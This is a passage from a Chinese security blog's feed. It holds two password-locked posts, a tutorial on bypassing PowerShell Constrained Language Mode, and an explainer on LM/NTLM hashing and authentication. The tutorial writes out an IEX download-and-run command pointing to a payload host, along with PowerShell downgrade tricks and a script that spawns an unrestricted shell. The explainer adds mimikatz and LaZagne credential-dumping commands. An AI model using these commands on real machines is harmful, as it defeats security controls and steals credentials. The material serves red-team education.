<p><a href="https://www.cnblogs.com/zengjfgit/p/5695173.html">https://www.cnblogs.com/zengjfgit/p/5695173.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>2022上半年个人总结</title>
    <url>/posts/e7789fd3/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f7e017c8639df345ba68a123597a396de606577be8108500df4dcb768b56c222">de64d47ec3cf90f53a7fdcf21575326eb3e38821bd54060a735255ca2e8237659cdfaeccc78a904cfd1fe57b4e191c211de23e519cd207da184c8b52dd1d542e6092fa8ff3bb4ceaab9fc196b4655e2537f82c05b26550fdf0b66ba1c866173adb71ad0ef8ac7852877018b1a11aa76bdff82680fdfda4415ac5906f7ef9de9f22906edfa9632a289457f0aac130a124b7892377db753fe7b47d0be0d6e18c97ddb9bbd59627f10f1814e57c755f1c820ae17e258ec99018b061aaceedc63c156a11f05c803842986b68b246ab3bee4996d3804dd381560112efe8b3812a711cfb1c677c646087e6e2949dd6cb8d86b9fee42ae25aa7194da86ec049ea710c532eca9c8017dd81b68e2c2755c06b8c099015da671e7efe6af4fc3297937dcb7a7dcbe06fdd3c98fb8da09f5281fb1ffff94e1b044cb7390f1d5fb39745d24fbdea8b8278efa05b6f6cfaa80d20fd478138506683f03c84ba9552ceefefc7e33da340aa6048669e2497f961fd63756a394a7ac11bdb2ea9295c806a93e77afcb223dfb1bced0462b51b3c9647747bcf0dd3125864a08115f1f891fe43f8f4183c4ad732207a398ac98646587d752d0933d21aa6809fb27fd4567054d478468d36f3441ab26f687db2fffbc8507a317bf78818aee687bd82a4e2f14bb24f1ff624539cfdf9ad0eefabac8ec4f02a01bc17feb039fe9e2da3c189b5ee8ed19708fac220f7b60bed7b414abd4928785e22430ec615b16a38043eba3b6a48928a3a638cb6c02806eafd5004a36ed353aa0391b8ef31575109caabf93d044095a7591f920fc88ff42525b76e3a9d5049ab6cfe8f7ffca870778507dede041073e67d4a02e8e2cd7eb8cba57d9a7e34d0e5b83b9e301fbde7a3068587777018b1e737b63fbadce311f954d76a6f9fa62835f686b23797a0e227cd60a50ec81713910c6010ded4b4a6590db5269cb7fe70d2c79cab1872161845fa5955129a4347b8732e00369f7f9e561cd32438aefb60a3d1623b71a7bbaef9783e0e8efee78f9d1b0f183f1879a78d3d434fd09d30bf3b8b345c6d65986b51740eccc18852a7b4697c7142b4083453a0c35a2fc6e7bef0259217b60445a67aec12dd86f59ccf70075b1fbffd38b41577ff175551ea5e7f73145affbbf2c584fe8b388cc4f317625ad8925d52be23e1312a671ff9e57730a24b51cf2733363fb056ed630d06481d381b5d7daed59d0d715ba63bb32788f4dfc0a081cc6fdc96b9ba4a25b9cce4f580bba1a46b1323832f89c1af5c62911984afedcf6ed187d596dfe63154a8118cf05d73683da09d85bd764f33d7fbd8ffdb3135d30996c009792e4b918a5579f702a44277276078b86063bffab8479760442ad5a1684aa64c1b70278fd7a2f23534ca910e255f9793a198c8128ccbe7654d4b2acd9ed65dce80bbbf4ceec1b21af8ae858e45de66458a327d12754bae63b2ab2f1c922822219da1554ca3f71b617b247fbed9b72ef5b9cd1fbfbe171786e876c84f8d103a6806834bf38149d990233344957e59a461965f91c4ff23d97db0fbe81a02f5d0565cd2b157005e468ce14eba8a43dc8022a1032f74ed2d19d42e5387c72b37eb3e3f3b62c403896d8e4d5d5a510d434d0b3786fecb4df48b4aa8a316d757e118ea83324bc963a6df098c054ddb240902983db82730fbd98006a8d2838f0cd158dd49ac8938f24781fec26ec1b2e826f3ed830b474dc95bf5d3d7e4f08c8ff2b18e07687fa6620dbcb38372d4392cef35d1f36f7207575c4fb7d5bfe88149e1e4504930ddb5ac7514747dbcedb566e4fa2e8b6e31698e4902d6a113a1ccafb051813a92c054bb1f444d0cb4e393a93133cbf3378e3d0f1379b8af06c68fc6a50c620759232aaa5dae59f18508aa7be8c97a494d167f6174dee582bf7807ee21fc829b11f56fc75bf4ce0742727af2adf327fdc658d7b23e366e2c02d775411fca47c4f33e2b67129951a2d3bf45ff7506159e8ad2242ea423fb838a727e3532661da51173474346830b005ad13035f9a674f4ca86cc64ef8afdf0e3b3cc47dae321e5a811bbbe56960d4f9de567deb2c6a78b7a665eebcad4ea113bf4563fc37840f779f0c94dbc87811b43594b29e78780482dffef9f0cb660b15fa9d0b45980ad7f0c418764e2de3d3cd0b1f9bc7dfacf5b74598534763aa969b1e26ce67de1a0c2b44c62e59175faf23807cf06672ac3e83715c29f49a3341980c0f2e97a61ba87574b314e083c84cf66cc1999469e8424e1857770b8c7bb666af0d22ddd900af959b0dc7f1ac50cd13ebe207701947b23e778c4cde08dee813fe1f535b62fd0c992cdac91fa27db7de781b9a5bf45b37441317e4bfd813a9611b49bd7091bb7fdd5c056190602461743c82b7aae5b15066ecc15170955de807da9ab41cb6667da95b42312b37695f69907c416705f3c2e72bafdab3d8c09834a86db7dde6a3cc17a6e351b1f67d64aa4fe80be38a7e250596a454a8826bb3f9a2b5b0a1e6822584b886b70dea9c84d8e7ab8eea627928cae2b143e347fa37eb328e8bf423ae6667cb43b996b423112ac0641ec83422f465d80fdbfdf0ee6eeedbfc865b333faed65ecc49332e188ac58594a366b8a23ed54841a83fa725dfd27f7ed0493956545d4b6c3b4fc3fca398def8f6b0b4a6d8d972a677d5bc65332da9ea4221d7109052aeea3eb62d60fa01a9c6faae3e07b7c0ec73943bf9f4e6d2cfc5b5f8e406cfe0afdafb5ada3c41706c78f2c5a8165d10e30f2f9bd408b7ed90101e2b12075dd9622d7648c1c77a11c80b5218acdb4b6f29e25c968c17367c75ee4a08c92c450d9b2071b9f554acbced40106aefbffdf7a26f89e423d9d525c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>记一次红队后反思与总结</title>
    <url>/posts/457578e1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="49571d624cb54a0761437fc846857e292468fd392cfe5038ea1290564dd0950d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>CLM Bypass</title>
    <url>/posts/39eca96/</url>
    <content><![CDATA[<h3 id="CLM"><a href="#CLM" class="headerlink" title="CLM"></a>CLM</h3><p>PowerShell Constrained Language Mode<a href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2">受限语言模式</a>是缓解PowerShell攻击的一种方式，能够阻止执行任意未签名的代码</p>
<p>查询</p>
<p><code>$ExecutionContext.SessionState.LanguageMode</code></p>
<p>在本地查询结果为<code>FullLanguage</code> 即未开启状态</p>
<p>开启CLM</p>
<p><code>$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;</code></p>
<p>测试语句 </p>
<p>IEX (New-Object Net.WebClient).DownloadString.(‘<a href="http://192.168.0.133:8000/payload.ps1&#39;">http://192.168.0.133:8000/payload.ps1&#39;</a>)</p>
<p>开启后会对此命令进行拦截</p>
<p><img src="/posts/39eca96/1.png"></p>
<h3 id="CLM-Bypass"><a href="#CLM-Bypass" class="headerlink" title="CLM Bypass"></a>CLM Bypass</h3><h4 id="Powershell降级"><a href="#Powershell降级" class="headerlink" title="Powershell降级"></a>Powershell降级</h4><p><code>powershell.exe -version 2</code></p>
<p><code>powershell.exe -version 2 -ExecutionPolicy bypass</code></p>
<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p><code> &amp;&#123; whoami &#125;</code></p>
<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>这里直接照搬国外大佬(<a href="https://sp00ks-git.github.io/posts/CLM-Bypass/)%E7%9A%84%E4%B8%80%E4%B8%AApowershell%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%90%8E%E4%BC%9A%E6%B4%BE%E7%94%9F%E5%87%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84powershell(%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%94%B9)">https://sp00ks-git.github.io/posts/CLM-Bypass/)的一个powershell命令，执行后会派生出一个新的powershell(这个版本可以根据命令进行更改)</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$CurrTemp</span> = <span class="variable">$env:temp</span></span><br><span class="line"><span class="variable">$CurrTmp</span> = <span class="variable">$env:tmp</span></span><br><span class="line"><span class="variable">$TEMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"><span class="variable">$TMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TEMPBypassPath</span>&quot;</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TMPBypassPath</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> win32_process <span class="literal">-Name</span> create <span class="literal">-ArgumentList</span> <span class="string">&quot;Powershell.exe&quot;</span> </span><br><span class="line"><span class="comment">#这里可以添加版本之类的参数</span></span><br><span class="line"><span class="comment">#Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;Powershell.exe -Version 2 -ExecutionPolicy bypass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Set it back</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="variable">$CurrTmp</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="variable">$CurrTemp</span></span><br></pre></td></tr></table></figure>

<p>也可以对以上命令进行混淆</p>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><blockquote>
<p><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a><br><a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a><br><a href="https://github.com/iomoath/PowerShx">https://github.com/iomoath/PowerShx</a></p>
</blockquote>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://sp00ks-git.github.io/posts/CLM-Bypass/">https://sp00ks-git.github.io/posts/CLM-Bypass/</a></p>
<p><a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></p>
<p><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a></p>
<p><a href="https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass">https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>NTLM认证&amp;NTLMRelay攻击(持续更新...)</title>
    <url>/posts/5f88ecbb/</url>
    <content><![CDATA[<h2 id="LM-与-NTLM"><a href="#LM-与-NTLM" class="headerlink" title="LM 与 NTLM"></a>LM 与 NTLM</h2><p>Windows对用户的密码凭证有两种加密算法，也就是本文写的ntlm和lm。在使用QuarksPwDump抓密码的时候经常看到形如这样的hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:1003:AAD3B435B51404EEAAD3B435B51404EE:111F54A2A4C0FB3D7CD9B19007809AD6:::</span><br><span class="line">Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9A81:::</span><br></pre></td></tr></table></figure>

<p>其中冒号分割的前半段<code>AAD3B435B51404EEAAD3B435B51404EE</code>是lm hash，后半段<code>111F54A2A4C0FB3D7CD9B19007809AD6</code>是ntlm hash。前半段放到cmd5解密会发现是空密码，那是因为Windows版本的原因。</p>
<p>下面是各个版本对LM和NTLM的支持：<br><img src="/posts/5f88ecbb/bdf41224a355f9053caecb77ca04c08a.png"><br>其中<br><img src="/posts/5f88ecbb/430d26d30d8c326725b492c8806c1ca0.png"></p>
<p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。(因此后面我们介绍身份认证的时候只介绍Net-ntlm，不再介绍net-lm)如果空密码或者不储蓄LM Hash的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。</p>
<p>接下来先介绍这两种认证的认证过程和加密算法。</p>
<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>LAN Manager (LM) Hash 时WIndows 系统所用的第一种密码哈希算法，本质为DES加密</p>
<h4 id="LM-Hash-生成原理"><a href="#LM-Hash-生成原理" class="headerlink" title="LM Hash 生成原理"></a>LM Hash 生成原理</h4><ul>
<li>  1.用户密码转换为大写，最大长度限制为14个字符，</li>
<li>  2.密码转换为16进制字符串，不足14个字节将用0来补全</li>
<li>  3.密码的16进制被分成两个7byte部分，每部分转换成比特流，并且长度为为56bit，长度不足则在左边用0补齐</li>
<li>  4.再分为7bit为一组，每组末尾加0，再组成一组</li>
<li>  5.将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串<code>KGS!@#$%</code>进行加密</li>
</ul>
<p>将 123994 使用文本编辑器 转换为十六进制</p>
<p>转换后 为 <code>313233393934</code> (12*4 bits) 而为了满足14字节(14 * 8 bits) 后续全都用0补全</p>
<p>所以 补全后的十六进制为 <code>3132333939340000 0000000000000000</code></p>
<p>将以上编码分词2组7字节(7*8 bits) <code>3132333939340000</code> <code>0000000000000000</code></p>
<p>将以上两组7字节的十六进制转换为 二进制，每7bit 一组末尾加0，再转换为十六进制组成的两组8字节的编码</p>
<p><code>31323339393400</code> 转换为 二进制位</p>
<p><code>00110001001100100011001100111001001110010011010000000000</code> 长度不足便在左边补0 这里从计算器复制过来没有前面两个0</p>
<p><code>0011000 1001100 1000110 0110011 1001001 1100100 1101000 0000000</code> 每7位分为一组</p>
<p><code>00110000 10011000 10001100 01100110 10010010 11001000 11010000 00000000</code> 每一组末尾补0</p>
<p>将每一组转换位十六进制</p>
<p><code>00110000 10011000 1000110 001100110 10010010 11001000 11010000 00000000</code><br><code>30 98 8C 66 92 C8 D0 00</code></p>
<p>最终得到 <code>30988C6692C8D000</code> 同理 <code>00000000000000</code> (14个0 ) 得到 <code>0000000000000000</code>(16个0)</p>
<p>最后再将 以上两组8字节编码 分别作为DES 加密的密钥 为 魔术字符串 <code>KGS!@#$%</code> 进行加密</p>
<p>该魔术字符串转换为16进制为 <code>4B47532140232425</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python实现LM-HASH脚本</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写,并转换为16进制字符串</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line">    <span class="comment"># 密码不足14字节将会用0来补全</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># 固定长度的密码被分成两个7byte部分</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># 再分7bit为一组末尾加0，组成新的编码</span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line">    <span class="comment"># 上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line">    <span class="comment"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="LM-Hash-缺点"><a href="#LM-Hash-缺点" class="headerlink" title="LM Hash 缺点"></a>LM Hash 缺点</h4><ul>
<li>1.密码长度最大只能为14个字符</li>
<li>2.密码无法区分大小写，在生成哈希值之前，所有密码都将转换为大写</li>
<li>3.如果密码强度小于7位，那个第二个分组加密后的结果一定为 aad3b435b51404ee</li>
<li>4.Des 容易被破解 密码强度不高</li>
</ul>
<p>在Windows Vista 和 Windows Server 2008 版本后 Windows默认禁用了LM Hash。LM-Hash 明文密码限制在14位以内，也就是说，如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash 通常为 <code>aad3b435b51404eeaad3b435b51404ee</code></p>
<hr>
<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>LM Hash 的脆弱性显而易见，所以微软于1993年在Windows NT 3.1中引入了NTLM协议。<br>NT LAN Manager (NTML) Hash 是基于MD4算法。从Windows Vista/Windows Server 2003以后Windows的默认认证方式均为NTLM Hash。</p>
<h4 id="NTLM-Hash生成原理"><a href="#NTLM-Hash生成原理" class="headerlink" title="NTLM Hash生成原理"></a>NTLM Hash生成原理</h4><ul>
<li>1.将用户密码转换为十六进制</li>
<li>2.将十六进制格式的密码转换成Unicode格式，即在每个字节之后添加0x00</li>
<li>3.使用MD4摘要算法对Unicode编码数据进行Hash计算</li>
</ul>
<p>以密码123456为例 ，</p>
<ul>
<li>  首先将密码字符串转换为十六进制，123456 =&gt; 31 32 33 34 35 36</li>
<li>  再进行Unicode 编码， 31 32 33 34 35 36 =&gt; 310032003300340035003600</li>
<li>  进行md4加密</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>




<hr>
<h2 id="NTLM-认证"><a href="#NTLM-认证" class="headerlink" title="NTLM 认证"></a>NTLM 认证</h2><p>NTLM认证 Windows 的 NTLM 认证就是利用 NTLM Hash 进行的认证，可以分为 <code>本地认证</code> 和 <code>网络认证</code> 两种方式。NTLM 的网络认证，既可用于域内的认证服务，又可用于工作组环境。NTLM 有 <code>NTLMv1</code> 、<code>NTLMv2</code> 、<code>NTLMsession v2</code> 三个版本，目前使用最多的是NTLMv2版本。</p>
<h3 id="NTLM本地认证"><a href="#NTLM本地认证" class="headerlink" title="NTLM本地认证"></a>NTLM本地认证</h3><p>本地认证采用sam hash比对的形式来判断用户密码是否正确，计算机本地用户的所有密码被加密存储在  <code>%SystemRoot%\system32\config\sam</code>  文件中，这个文件更像是一个存储用户密码的数据库。</p>
<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成  <em><code>NTLM Hash</code></em> ，与 SAM数据库中的  <em><code>NTLM Hash</code></em>  进行比较，从而实现认证。</p>
<h4 id="NTLM本地认证详细流程"><a href="#NTLM本地认证详细流程" class="headerlink" title="NTLM本地认证详细流程"></a>NTLM本地认证详细流程</h4><blockquote>
<p>winlogon.exe即Windows Logon Process，是Windows NT用户登陆程序，用于管理用户登录和退出。<br>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</p>
</blockquote>
<ul>
<li>  当用户注销、重启、锁屏后，操作系统会让 <code>winlogon.exe</code> 显示登陆界面</li>
<li>  当winlogon.exe接收到账号密码输入之后，会将密码交给lsass进程</li>
<li>  将明文密码加密成NTLM Hash</li>
<li>  与SAM数据库比较认证</li>
</ul>
<h4 id="读取SAM中文件的NTLM-Hash"><a href="#读取SAM中文件的NTLM-Hash" class="headerlink" title="读取SAM中文件的NTLM Hash"></a>读取SAM中文件的NTLM Hash</h4><p>如果想要读取SAM文件的话，需要借助一些工具来读取NTLM中的hash值<br><img src="/posts/5f88ecbb/20220424101819.png"></p>
<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><p>项目地址：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>注意：</p>
<ul>
<li>  需要管理员权限</li>
<li>  当机器安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。</li>
</ul>
<p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot;</code></p>
<p><img src="/posts/5f88ecbb/20220424103059.png"></p>
<h5 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h5><p>注意：需要管理员权限</p>
<p><code>lazagne.exe all</code><br><img src="/posts/5f88ecbb/20220424102700.png"></p>
<hr>
<h3 id="NTLM网络认证"><a href="#NTLM网络认证" class="headerlink" title="NTLM网络认证"></a>NTLM网络认证</h3><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。(这个协议只支持Windows)，由三种消息组成：通常称为<code>type 1(协商)</code>，<code>类型type 2(质询)</code>和<code>type 3(身份验证)</code>。</p>
<ul>
<li>  协商 主要用于确认双方协议版本(NTLM v1/NTLM V2)</li>
<li>  质询 就是挑战（Challenge）/响应（Response）认证机制起作用的范畴。</li>
<li>  验证 验证主要是在质询完成后，验证结果，是认证的最后一步。</li>
</ul>
<p><img src="/posts/5f88ecbb/8b8495805c013d2a45020dc199a53ca0.png"></p>
<ul>
<li><p>1.用户登录客户端电脑</p>
</li>
<li><p>2.（Type1 协商） 客户端向服务器发送Type1(协商消息)。 主要包含客户端支持和服务器请求的功能列表</p>
</li>
<li><p>3.（Type2 响应） 服务器用Type2消息(质询)进行响应，将传输数据传给NTLM SSP进行处理，然后返回一个16为随机值(称为<code>challenge</code>)，将其发送给客户端并在本地缓存该<code>challenge</code>。</p>
</li>
<li><p>4.（Type3 身份认证） 客户端用Type3消息(身份验证)回复质询。客户端接收到过程3中的<code>challenge</code>后，使用用户hash与本地缓存的<code>challenge</code>进行加密运算得到<code>response</code>（Net-NTLM Hash1），将<code>response，username，challenge</code>封装后一起发送给服务器。</p>
</li>
<li><p>其中的<code>response</code> 最为关键，因为它们像服务器证明客户端用户已经知道了账户的密码。</p>
</li>
<li><ol start="5">
<li> 服务器拿到Type3（认证消息）之后，会使用本地缓存的<code>challenge</code>和用户hash进行加密得到<code>response2</code>（Net-NTLM Hash2）Type3发来的<code>response</code>(Net-NTLM Hash1)进行比较，如果匹配则认证通过  </li>
</ol>
</li>
<li><p>【如果用户hash是存储在域控里面的话，那么没有用户hash就没办法去计算response2。也就没法验证。这时用户服务器就会通过NetLogon协议练习用户建立一个安全通道然后将Type1，Type2，Type3全部发给域控(这个过程也叫 <code>Pass Through Authentication</code> 认证流程)】</p>
</li>
<li><p>6.域控使用challenge和用户的Hash进行加密得到 <code>response2</code> 与Type3的<code>response</code>进行比较</p>
</li>
</ul>
<p><img src="/posts/5f88ecbb/99f58b1ec9929b60acbfe3a7f879f37c.jpg"><br>在域环境下，<code>NTLM</code>的认证方式与上面基本相同，唯一不同点是第5步，服务端会向域控请求校验。<br><img src="/posts/5f88ecbb/25722010906bb6021175f8bbb23a32f0.jpg"></p>
<p>在这里，如果我们获得了NTLM-Hash，那么我们可以直接进行PTH攻击，但不能用来Relay；而如果我们获得了Net NTLM-Hash，那么我们可以对其进行爆力破解得到明文，也可以利用Net NTLM-Hash进行中继攻击。</p>
<p>注意:</p>
<ul>
<li><code>Challenge</code> 是 Server产生的一个16字节的随机数，再每次认证时都不同。</li>
<li><code>Response</code> 的表现形式为Net-NTLM Hash，他是有客户端提供密码Hash加密Server返回的Challenge产生的结果。</li>
</ul>
<p>简单的说就是</p>
<ol>
<li>协商<br>客户端发送协商消息（包含用户的NTLM Hash）给服务端。</li>
</ol>
<p>2.响应<br>服务端收到协商消息后 生成一个<code>challenge</code> 发送给客户端，并在本地缓存<code>challenge</code>方便后续认证时进行对比。</p>
<p>3.身份认证<br>客户端收到<code>challenge</code> 后，将<code>challenge</code>与本地hash加密得到<code>response</code> ，将<code>response</code>与username、<code>challenge</code>等一起封装后发送给服务端;<br>服务端接收到客户端发送的认证消息后，将本地缓存的<code>challenge</code>与用户Hash加密得到<code>response2</code> 与 发来的<code>response</code>进行比较，如果匹配那么认证就通过。</p>
<hr>
